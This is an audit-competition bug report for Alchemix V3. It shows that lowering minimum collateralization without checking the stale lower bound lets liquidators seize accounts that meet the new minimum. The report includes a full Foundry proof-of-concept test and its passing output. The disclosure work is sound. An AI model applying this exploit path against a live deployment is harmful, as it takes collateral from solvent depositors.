# 56800 sc medium minimum collateral change lets liquidators seize compliant accounts

## #56800 \[SC-Medium] Minimum collateral change lets liquidators seize compliant accounts

**Submitted on Oct 20th 2025 at 20:10:23 UTC by @pxng0lin for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56800
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## Bug Description

`setMinimumCollateralization()` in `src/AlchemistV3.sol` only checks `value >= FIXED_POINT_SCALAR`. It never validates the stored `collateralizationLowerBound`. Lowering the minimum below the bound leaves the bound unchanged and `liquidate()` starts targeting positions that still satisfy the new minimum.

## Brief/Intro

Changing the minimum collateralization is enough to put the system in an invalid state. No price move is required; any position sitting between the new minimum and the stale lower bound becomes liquidatable immediately.

## Scenario

* Governance lowers `minimumCollateralization` from 150% to 105% but leaves `collateralizationLowerBound` at 110%.
* A depositor sitting at 130% withdraws until their ratio is 109% (still above the new minimum). In the PoC this leaves the account with \~65.4 MYT shares supporting 60 alTokens of debt.
* Liquidators call `liquidate()` and seize the account because 109% is below the unchanged 110% bound. The liquidation drains 60 MYT shares, leaving the user with \~5.4 shares and zero debt.

## Details

* `setCollateralizationLowerBound()` already enforces `value <= minimumCollateralization` (`src/AlchemistV3.sol:308-314`).
* `setMinimumCollateralization()` lacks the mirror check (`src/AlchemistV3.sol:292-301`). Governance can set the minimum below the bound.
* `liquidate()` (`src/AlchemistV3.sol:786-839`) compares ratios only against `collateralizationLowerBound`. Accounts that satisfy the new minimum but miss the bound are liquidated.
* There is no event or validation to catch this configuration error.

## Impact

* **Forced liquidations:** Solvent users lose collateral without a market trigger (e.g., 60 of the remaining 65.4 MYT shares are seized in the PoC).
* **Protocol configuration risk:** A single governance action exposes every account.

## References

* `src/AlchemistV3.sol`
* `interfaces/IAlchemistV3.sol`

### Proof of Concept

### Proof of Concept

* Create the test file e.g. `AlchemistV3CollaterilizationLowB.t.sol` in the existing \*/src/test directory.
* Add the code below.
* Run in terminal with command `forge t --mt testProxySetupAllowsLiquidationDespiteHigherMinCollateral -vvv`

#### Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {AlchemistV3} from "../src/AlchemistV3.sol";
import {AlchemistV3Position} from "../src/AlchemistV3Position.sol";
import {AlchemistInitializationParams, IAlchemistV3} from "../src/interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../src/interfaces/ITransmuter.sol";
import {TokenUtils} from "../src/libraries/TokenUtils.sol";
import {Transmuter} from "../src/Transmuter.sol";
import {AlchemicTokenV3} from "../src/test/mocks/AlchemicTokenV3.sol";
import {TestERC20} from "../src/test/mocks/TestERC20.sol";
import {MockYieldToken} from "../src/test/mocks/MockYieldToken.sol";
import {MockMYTStrategy} from "../src/test/mocks/MockMYTStrategy.sol";
import {MockAlchemistAllocator} from "../src/test/mocks/MockAlchemistAllocator.sol";
import {MockMYTVault} from "../src/test/mocks/MockMYTVault.sol";
import {MYTTestHelper} from "../src/test/libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../src/interfaces/IMYTStrategy.sol";
import {EulerUSDCAdapter} from "../src/adapters/EulerUSDCAdapter.sol";
import {AlchemistTokenVault} from "../src/AlchemistTokenVault.sol";

/// @notice High-fidelity PoC using proxy deployment and real MYT vault/adapter plumbing.
contract AlchemistV3CollateralizationLowerBoundProxyTest is Test {
    uint256 constant FIXED_POINT_SCALAR = 1e18;
    uint256 constant INITIAL_MIN_COLLATERAL = 1_500_000_000_000_000_000; // 150%
    uint256 constant INITIAL_LOWER_BOUND = 1_100_000_000_000_000_000; // 110%
    uint256 constant NEW_MIN_COLLATERAL = 1_050_000_000_000_000_000; // 105%
    uint256 constant TARGET_RATIO = 1_090_000_000_000_000_000; // 109%
    uint256 constant STRATEGY_ABSOLUTE_CAP = 2_000_000_000e18;

    address constant ADMIN = address(0x4444);
    address constant CURATOR = address(0x8888);
    address constant OPERATOR = address(0x2222);
    address constant GOVERNANCE = address(0xDEAD);
    address constant DEPOSITOR = address(0xAA11);
    address constant LIQUIDATOR = address(0xD00D);

    AlchemistV3 alchemist;
    AlchemistV3Position alchemistNFT;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    TransparentUpgradeableProxy proxyAlchemist;
    MockMYTVault vault;
    MockMYTStrategy mytStrategy;
    MockAlchemistAllocator allocator;
    MockYieldToken yieldToken;
    TestERC20 underlying;
    EulerUSDCAdapter adapter;
    AlchemistTokenVault feeVault;

    address externalUser = address(0xBEEF);

    function setUp() public {
        // Underlying ERC20 and MYT setup
        underlying = new TestERC20(0, 18);
        yieldToken = new MockYieldToken(address(underlying));

        vm.startPrank(ADMIN);
        vault = MYTTestHelper._setupVault(address(underlying), ADMIN, CURATOR);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), address(yieldToken), ADMIN, "MockToken", "MockTokenProtocol",  IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), ADMIN, OPERATOR);
        vm.stopPrank();

        vm.startPrank(CURATOR);
        _vaultSubmitAndFastForward(abi.encodeCall(vault.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(vault.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(vault.increaseAbsoluteCap, (idData, STRATEGY_ABSOLUTE_CAP)));
        vault.increaseAbsoluteCap(idData, STRATEGY_ABSOLUTE_CAP);
        _vaultSubmitAndFastForward(abi.encodeCall(vault.increaseRelativeCap, (idData, FIXED_POINT_SCALAR)));
        vault.increaseRelativeCap(idData, FIXED_POINT_SCALAR);
        vm.stopPrank();

        // Deploy alchemist via proxy with real components
        alToken = new AlchemicTokenV3("AlToken", "AL", 0);
        transmuterLogic = new Transmuter(ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: ADMIN,
            timeToTransmute: 10,
            transmutationFee: 0,
            exitFee: 0,
            graphSize: 10
        }));

        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: ADMIN,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: INITIAL_MIN_COLLATERAL,
            globalMinimumCollateralization: INITIAL_MIN_COLLATERAL,
            collateralizationLowerBound: INITIAL_LOWER_BOUND,
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: ADMIN,
            liquidatorFee: 300,
            repaymentFee: 0,
            myt: address(vault)
        });

        AlchemistV3 alchemistLogic = new AlchemistV3();
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), ADMIN, abi.encodeWithSelector(AlchemistV3.initialize.selector, params));
        alchemist = AlchemistV3(address(proxyAlchemist));

        alToken.setWhitelist(address(alchemist), true);
        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        vm.prank(ADMIN);
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        feeVault = new AlchemistTokenVault(address(underlying), address(alchemist), ADMIN);
        vm.prank(ADMIN);
        alchemist.setAlchemistFeeVault(address(feeVault));

        adapter = new EulerUSDCAdapter(address(yieldToken), address(underlying));
        vm.prank(ADMIN);
        alchemist.setTokenAdapter(address(adapter));

        // Seed balances and approvals
        // Unique actors:
        // - `GOVERNANCE` controls risk parameters (e.g., lowering minimum collateralization)
        // - `DEPOSITOR` manages the position and bears the loss
        // - `LIQUIDATOR` independently seizes collateral once invariant is broken
        deal(address(underlying), DEPOSITOR, 1_000 ether);
        deal(address(underlying), externalUser, 1_000 ether);
        deal(address(underlying), address(allocator), 1_000 ether);

        vm.startPrank(DEPOSITOR);
        TokenUtils.safeApprove(address(underlying), address(vault), type(uint256).max);
        vault.deposit(500 ether, DEPOSITOR);
        vm.stopPrank();

        vm.startPrank(externalUser);
        TokenUtils.safeApprove(address(underlying), address(vault), type(uint256).max);
        vault.deposit(500 ether, externalUser);
        vm.stopPrank();

        vm.startPrank(address(allocator));
        TokenUtils.safeApprove(address(underlying), address(vault), type(uint256).max);
        vault.deposit(500 ether, address(allocator));
        vm.stopPrank();

        vm.startPrank(ADMIN);
        allocator.allocate(address(mytStrategy), 500 ether);
        vm.stopPrank();
    }

    function testProxySetupAllowsLiquidationDespiteHigherMinCollateral() public {
        vm.startPrank(ADMIN);
        alchemist.setPendingAdmin(GOVERNANCE);
        vm.stopPrank();

        vm.prank(GOVERNANCE);
        alchemist.acceptAdmin();

        vm.startPrank(DEPOSITOR);
        TokenUtils.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(100 ether, DEPOSITOR, 0);
        uint256 tokenId = 1;
        emit log("--- Position setup ---");
        emit log_named_uint("Initial collateral (MYT shares)", 100 ether);

        alchemist.mint(tokenId, 60 ether, DEPOSITOR);
        emit log_named_uint("Minted debt (alTokens)", 60 ether);

        vm.stopPrank();

        vm.prank(GOVERNANCE);
        alchemist.setMinimumCollateralization(NEW_MIN_COLLATERAL);
        emit log("--- Governance change ---");
        emit log_named_uint("Minimum collateralization (new)", NEW_MIN_COLLATERAL);
        emit log_named_uint("Collateralization lower bound (unchanged)", alchemist.collateralizationLowerBound());

        uint256 collateralBefore = alchemist.totalValue(tokenId);
        uint256 targetCollateral = (60 ether * TARGET_RATIO) / FIXED_POINT_SCALAR;
        uint256 withdrawAmount = collateralBefore - targetCollateral;

        vm.prank(DEPOSITOR);
        alchemist.withdraw(withdrawAmount, DEPOSITOR, tokenId);
        emit log("--- Depositor rebalances to new minimum ---");
        emit log_named_uint("Collateral before withdraw (shares)", collateralBefore);
        emit log_named_uint("Target collateral at 109%", targetCollateral);
        emit log_named_uint("Collateral withdrawn", withdrawAmount);

        (uint256 collateral,,) = alchemist.getCDP(tokenId);
        uint256 ratio = collateral * FIXED_POINT_SCALAR / 60 ether;
        vm.assertGt(ratio, NEW_MIN_COLLATERAL);
        vm.assertLt(ratio, alchemist.collateralizationLowerBound());
        emit log_named_uint("Post-withdraw collateral", collateral);
        emit log_named_uint("Resulting ratio (1e18 scale)", ratio);
        emit log_named_uint("Check: minimum collateralization", NEW_MIN_COLLATERAL);
        emit log_named_uint("Check: lower bound threshold", alchemist.collateralizationLowerBound());

        vm.startPrank(LIQUIDATOR);
        (uint256 amountLiquidated,,) = alchemist.liquidate(tokenId);
        vm.stopPrank();
        emit log("--- Liquidation ---");
        emit log_named_uint("Collateral seized", amountLiquidated);

        vm.assertGt(amountLiquidated, 0);
        uint256 collateralAfter = alchemist.totalValue(tokenId);
        (, uint256 postDebt,) = alchemist.getCDP(tokenId);
        vm.assertLt(collateralAfter, collateral);
        vm.assertLt(postDebt, 60 ether);
        emit log_named_uint("Collateral remaining", collateralAfter);
        emit log_named_uint("Debt remaining", postDebt);
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }
}
```

#### Results:

```shell
[PASS] testProxySetupAllowsLiquidationDespiteHigherMinCollateral() (gas: 1206466)
Logs:
  --- Position setup ---
  Initial collateral (MYT shares): 100000000000000000000
  Minted debt (alTokens): 60000000000000000000
  --- Governance change ---
  Minimum collateralization (new): 1050000000000000000
  Collateralization lower bound (unchanged): 1100000000000000000
  --- Depositor rebalances to new minimum ---
  Collateral before withdraw (shares): 100000000000000000000
  Target collateral at 109%: 65400000000000000000
  Collateral withdrawn: 34600000000000000000
  Post-withdraw collateral: 65400000000000000000
  Resulting ratio (1e18 scale): 1090000000000000000
  Check: minimum collateralization: 1050000000000000000
  Check: lower bound threshold: 1100000000000000000
  --- Liquidation ---
  Collateral seized: 60000000000000000000
  Collateral remaining: 5400000000000000000
  Debt remaining: 0
```
